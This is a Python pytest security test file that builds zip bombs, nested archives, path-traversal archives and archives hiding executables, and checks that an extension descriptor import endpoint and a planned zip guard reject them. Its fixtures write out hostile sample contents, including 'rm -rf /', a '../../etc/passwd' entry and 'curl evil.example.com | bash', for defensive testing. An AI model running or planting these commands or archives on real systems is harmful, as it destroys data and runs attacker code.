"""Security tests for archive/file upload abuse vectors.

Covers:
- Zip bomb detection: decompression ratio, nested archives, excessive file count
- Upload size limits for archive files
- Extension abuse (double extension, disguised executables)
- Archive content that references path traversal targets

Design note: the current codebase stores uploaded files as opaque blobs and does not
extract archives. Tests document expected behavior for both the existing opaque-storage
path and anticipated future extraction guards. Tests that require archive extraction
are clearly annotated with their coverage intent so they remain visible as the
feature surface grows.

Run:
    docker compose exec fs-app python -m pytest tests/security/test_upload_archive_abuse.py -v
"""

from __future__ import annotations

import io
import json
import sys
import zipfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

_OPTIONAL_TEST_DEPS = {
    "fastapi",
    "starlette",
    "pydantic",
    "jinja2",
    "psycopg_runtime",
    "langgraph",
    "langchain_core",
}


def _skip_on_optional_dep(exc: Exception, *, context: str) -> None:
    if isinstance(exc, ModuleNotFoundError) and getattr(exc, "name", "") in _OPTIONAL_TEST_DEPS:
        pytest.skip(f"{context}: missing optional dependency '{exc.name}'")
    raise exc


# ---------------------------------------------------------------------------
# Archive construction helpers
# ---------------------------------------------------------------------------


def _make_zip_bomb_bytes(
    *,
    inner_size: int = 10 * 1024 * 1024,  # uncompressed size of each inner file
    inner_count: int = 10,
    filename_prefix: str = "payload",
) -> bytes:
    """Return a zip archive whose total uncompressed size far exceeds its compressed size.

    The archive is valid and readable; it is only the decompression ratio that is
    adversarial. inner_size * inner_count = total decompressed bytes.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for i in range(inner_count):
            zf.writestr(
                f"{filename_prefix}_{i:03d}.txt",
                b"\x00" * inner_size,  # null bytes compress aggressively
            )
    buf.seek(0)
    return buf.read()


def _make_nested_zip_bytes(*, depth: int = 3, leaf_size: int = 1024) -> bytes:
    """Return a zip archive that contains another zip archive (nested, depth levels deep)."""
    # Build from inside out
    buf = io.BytesIO()
    buf.write(b"innermost content " * (leaf_size // 18 + 1))
    buf.seek(0)
    current_bytes = buf.read()

    for level in range(depth):
        outer = io.BytesIO()
        with zipfile.ZipFile(outer, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"level_{level}.zip", current_bytes)
        outer.seek(0)
        current_bytes = outer.read()
    return current_bytes


def _make_zip_with_traversal_paths() -> bytes:
    """Return a zip archive with path-traversal filenames (e.g. ../../etc/passwd)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        # zipfile.ZipFile.writestr uses the name as-is in the central directory
        info = zipfile.ZipInfo("../../etc/passwd")
        zf.writestr(info, "root:x:0:0:root:/root:/bin/bash\n")
        info2 = zipfile.ZipInfo("../../../tmp/evil.sh")
        zf.writestr(info2, "#!/bin/bash\nrm -rf /\n")
    buf.seek(0)
    return buf.read()


def _make_zip_with_executable() -> bytes:
    """Return a zip archive containing a file with an executable extension."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("payload.exe", b"MZ\x90\x00" + b"\x00" * 60)  # MZ header
        zf.writestr("backdoor.sh", "#!/bin/bash\ncurl evil.example.com | bash\n")
    buf.seek(0)
    return buf.read()


# ---------------------------------------------------------------------------
# HTTP upload fixture
# ---------------------------------------------------------------------------


def _extension_service_error_response(exc, *_args, **_kwargs):
    try:
        from fastapi.responses import JSONResponse
    except Exception as e:
        _skip_on_optional_dep(
            e, context="Could not import JSONResponse for extension route harness"
        )

    payload = getattr(exc, "payload", None)
    if not isinstance(payload, dict):
        payload = {}
    return JSONResponse(
        {"error": getattr(exc, "message", str(exc)), "payload": payload},
        status_code=int(getattr(exc, "status_code", 500) or 500),
    )


def _extension_api_error_response(exc, *_args, **_kwargs):
    try:
        from fastapi.responses import JSONResponse
    except Exception as e:
        _skip_on_optional_dep(
            e, context="Could not import JSONResponse for extension route harness"
        )

    return JSONResponse({"error": str(exc)}, status_code=500)


def _make_extension_descriptor_import_client():
    try:
        from fastapi import FastAPI, Request
        from fastapi.testclient import TestClient

        from core.application.extensions.install import ExtensionInstallStore
        from core.application.extensions.runtime_store import ExtensionRuntimeStore
        from core.application.management.scope import ScopeContext
        from core.entrypoints.api.integrations_connectors import (
            create_integrations_connectors_router,
        )
    except Exception as e:
        _skip_on_optional_dep(e, context="Could not create extension descriptor import TestClient")

    app = FastAPI()
    extension_store = ExtensionInstallStore()
    runtime_store = ExtensionRuntimeStore()
    bl = MagicMock()

    def _request_scope(request: Request, **kwargs):
        return ScopeContext(
            account_id=str(request.headers.get("x-test-account-id") or "acc_default").strip(),
            actor_id=str(request.headers.get("x-test-actor") or "api").strip(),
            principal_type=str(request.headers.get("x-test-role") or "admin").strip().lower(),
            project_id=kwargs.get("project_id"),
        )

    app.include_router(
        create_integrations_connectors_router(
            get_logger=lambda: bl,
            get_extension_install_store=lambda: extension_store,
            get_extension_runtime_store=lambda: runtime_store,
            extension_query_service=lambda: MagicMock(),
            request_scope=_request_scope,
            project_query_service=lambda: MagicMock(),
            project_command_service=lambda: MagicMock(),
            service_error_response=_extension_service_error_response,
            api_error_response=_extension_api_error_response,
            err_not_found="Not found",
        )
    )
    return TestClient(app, raise_server_exceptions=False)


# ===========================================================================
# Archive structure tests (library-level — no HTTP)
# ===========================================================================


class TestZipBombStructure:
    """Verify that the archive-construction helpers produce adversarial structures."""

    def test_zip_bomb_has_high_decompression_ratio(self):
        inner_size = 1024 * 1024  # 1 MB uncompressed per file
        inner_count = 5
        raw = _make_zip_bomb_bytes(inner_size=inner_size, inner_count=inner_count)
        compressed_size = len(raw)
        expected_uncompressed = inner_size * inner_count  # 5 MB
        ratio = expected_uncompressed / max(compressed_size, 1)
        # Null bytes compress to a very high ratio — ratio should be >> 10x
        assert ratio > 10, f"Expected compression ratio > 10, got {ratio:.1f}"

    def test_zip_bomb_is_valid_zip(self):
        raw = _make_zip_bomb_bytes(inner_size=1024, inner_count=3)
        buf = io.BytesIO(raw)
        with zipfile.ZipFile(buf) as zf:
            names = zf.namelist()
        assert len(names) == 3

    def test_nested_zip_is_valid_zip(self):
        raw = _make_nested_zip_bytes(depth=2)
        buf = io.BytesIO(raw)
        with zipfile.ZipFile(buf) as zf:
            names = zf.namelist()
        assert len(names) >= 1
        # The outer layer must contain a zip entry
        assert any(n.endswith(".zip") for n in names)

    def test_traversal_zip_contains_path_traversal_names(self):
        raw = _make_zip_with_traversal_paths()
        buf = io.BytesIO(raw)
        with zipfile.ZipFile(buf) as zf:
            names = zf.namelist()
        assert any(".." in n for n in names)

    def test_executable_zip_contains_exe_entry(self):
        raw = _make_zip_with_executable()
        buf = io.BytesIO(raw)
        with zipfile.ZipFile(buf) as zf:
            names = zf.namelist()
        assert any(n.endswith((".exe", ".sh")) for n in names)


# ===========================================================================
# Upload endpoint behavior (requires TestClient)
# ===========================================================================


class TestExtensionDescriptorImportArchiveAbuse:
    @pytest.mark.parametrize(
        ("filename", "builder"),
        [
            ("descriptor.zip", _make_nested_zip_bytes),
            ("descriptor.json", _make_zip_with_traversal_paths),
            ("descriptor.yaml", _make_zip_with_executable),
        ],
    )
    def test_extension_descriptor_import_rejects_archive_inputs_with_typed_400(
        self, tmp_path, filename, builder
    ):
        archive_path = tmp_path / filename
        archive_path.write_bytes(builder())

        with _make_extension_descriptor_import_client() as client:
            resp = client.post(
                "/api/extensions/descriptors/import/file",
                json={"descriptor_path": str(archive_path)},
            )

        assert resp.status_code == 400
        body = resp.json()
        assert body["error"] == "Descriptor validation failed"
        assert body["payload"]["warnings"] == []
        assert body["payload"]["errors"][0]["code"] == "archive_not_supported"
        assert "does not accept archive inputs" in body["payload"]["errors"][0]["message"].lower()

    def test_extension_descriptor_import_rejects_oversized_descriptor_with_413(
        self, tmp_path, monkeypatch
    ):
        descriptor_path = tmp_path / "oversized-descriptor.json"
        oversized_payload = {"payload": "x" * 2048}
        descriptor_path.write_text(json.dumps(oversized_payload), encoding="utf-8")
        monkeypatch.setenv("FS_EXTENSION_DESCRIPTOR_MAX_BYTES", "128")

        with _make_extension_descriptor_import_client() as client:
            resp = client.post(
                "/api/extensions/descriptors/import/file",
                json={"descriptor_path": str(descriptor_path)},
            )

        assert resp.status_code == 413
        body = resp.json()
        assert body["error"] == "Descriptor validation failed"
        assert body["payload"]["errors"][0]["code"] == "descriptor_file_too_large"
        assert "maximum allowed size" in body["payload"]["errors"][0]["message"].lower()


# ===========================================================================
# Decompression ratio guard (unit contract — for extraction gate when added)
# ===========================================================================


class TestDecompressionRatioGuard:
    """Unit contract for a zip safety validation function.

    These tests define the expected interface for a `validate_zip_safe()` guard
    that MUST be added before any archive extraction functionality is introduced.
    If the guard function does not exist yet, tests are skipped — they become
    green automatically once the implementation lands.
    """

    @pytest.fixture(autouse=True)
    def require_zip_guard(self):
        try:
            from core.infrastructure.security import zip_guard  # noqa: F401
        except ImportError:
            pytest.skip(
                "core.infrastructure.security.zip_guard not yet implemented — "
                "this test suite validates the expected interface for archive extraction guards"
            )

    def test_zip_bomb_is_flagged(self):
        from core.infrastructure.security.zip_guard import validate_zip_safe

        raw = _make_zip_bomb_bytes(inner_size=5 * 1024 * 1024, inner_count=5)
        buf = io.BytesIO(raw)
        result = validate_zip_safe(buf, max_ratio=10, max_size_bytes=50 * 1024 * 1024)
        assert result.safe is False
        assert "ratio" in (result.reason or "").lower() or "size" in (result.reason or "").lower()

    def test_legitimate_zip_is_allowed(self):
        from core.infrastructure.security.zip_guard import validate_zip_safe

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("readme.txt", "Hello, world!\n")
            zf.writestr("data.json", '{"key": "value"}\n')
        buf.seek(0)
        result = validate_zip_safe(buf, max_ratio=100, max_size_bytes=10 * 1024 * 1024)
        assert result.safe is True

    def test_nested_zip_exceeding_depth_limit_is_flagged(self):
        from core.infrastructure.security.zip_guard import validate_zip_safe

        nested = _make_nested_zip_bytes(depth=5)
        buf = io.BytesIO(nested)
        result = validate_zip_safe(buf, max_nesting_depth=2)
        assert result.safe is False
        assert "nested" in (result.reason or "").lower() or "depth" in (result.reason or "").lower()

    def test_traversal_paths_flagged(self):
        from core.infrastructure.security.zip_guard import validate_zip_safe

        raw = _make_zip_with_traversal_paths()
        buf = io.BytesIO(raw)
        result = validate_zip_safe(buf)
        assert result.safe is False
        assert (
            "traversal" in (result.reason or "").lower() or "path" in (result.reason or "").lower()
        )

    def test_excessive_file_count_flagged(self):
        from core.infrastructure.security.zip_guard import validate_zip_safe

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            for i in range(1001):
                zf.writestr(f"file_{i:04d}.txt", "x")
        buf.seek(0)
        result = validate_zip_safe(buf, max_file_count=1000)
        assert result.safe is False

    def test_corrupt_zip_flagged(self):
        from core.infrastructure.security.zip_guard import validate_zip_safe

        buf = io.BytesIO(b"PK\x03\x04" + b"\xff" * 100)  # invalid zip body
        result = validate_zip_safe(buf)
        assert result.safe is False
